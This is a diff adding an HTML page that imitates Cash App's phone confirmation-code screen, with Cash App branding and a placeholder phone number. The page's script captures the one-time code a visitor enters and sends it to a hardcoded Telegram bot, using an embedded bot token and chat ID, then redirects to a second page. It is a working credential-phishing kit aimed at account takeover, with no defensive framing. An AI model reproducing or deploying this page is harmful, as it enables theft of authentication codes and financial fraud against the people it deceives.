@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cash app</title>
+    <style>
+        body{
+            
+            background: #171819;
+        }
+        nav{
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        img{
+            width: 10%;
+            border-radius: 12px;
+        }
+        section{
+            background: #222324;
+            width: 300px;
+            margin: 20px auto;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 20px 10px;
+            border-radius: 10px;
+        }
+        h1{color: white; font-size: 30px; width: 80%;}
+        .par1{color: gray; margin-top: -5px; width: 80%;}
+        a{text-decoration: none; color: #00BD46;}
+        .formn{
+            display: flex;
+            width: 80%;
+            height: 50px;
+            margin: 0 auto;
+            background: #434445;
+            border-radius: 12px;
+        }
+        label p{
+            width: 100%;
+            color: gray;
+            margin: 10px 20px;
+            font-weight: bold;
+        }
+        .sis{
+            width: 90%;
+            margin: 0 auto;
+        }
+        .end{
+            border: green solid 2px;
+            outline: none;
+            background: #434445;
+            width: 80%;
+            padding: 15px;
+            border-radius: 10px;
+            
+        }
+        #sub{
+            background: #00bd46;
+            border: none;
+            outline: none;
+            color: white;
+            width: 92%;
+            height: 40px;
+            border-radius: 10px;
+            margin: 20px auto; 
+            font-weight: bold;
+        }
+        
+    </style>
+</head>
+<body>
+    <nav>
+        <img src="OIP~2.jpeg" alt=""><h1>Cash App</h1></img>
+    </nav>
+    
+    <section>
+        <h1>Enter the code sent to your phone</h1>
+        <p class="par1">We sent the code to (234) 567-8903<br><br><a href="#">Get help</a></p>
+        <div class="">
+            <form d="telegramForm" onsubmit="enviarMensaje(event)">
+               <label><p>Confirmation code</p></label>
+               <div class="sis">
+                   <input type="number" id="in" name="" placeholder="Code" class="end" required>
+               <input type="submit" value="Continue" id="sub">
+               </div>             
+            </form>
+        </div>
+    </section>
+    <script>
+ function enviarMensaje(event) {
+                     event.preventDefault(); // Prevent the default form submission
+                     var nombre = document.getElementById('in').value;
+                     var url = 'https://api.telegram.org/bot6515092765:AAFtV23G--qiedt2pDQvqolm4Gz6pDMWDyY/sendMessage?chat_id=6290563770&text=OTP: ' + nombre;
+             
+                     fetch(url)
+                         .then(response => {
+                             // Handle the response as needed
+                             console.log('Mensaje enviado exitosamente');
+                             window.location.href = 'page2.html'; // Redirect to page2.html
+                         })
+                         .catch(error => {
+                             // Handle any errors that occur during the request
+                             console.error('Error al enviar el mensaje:', error);
+                         });
+                 }
+    </script>
+    <br>
+</body>
+</html>
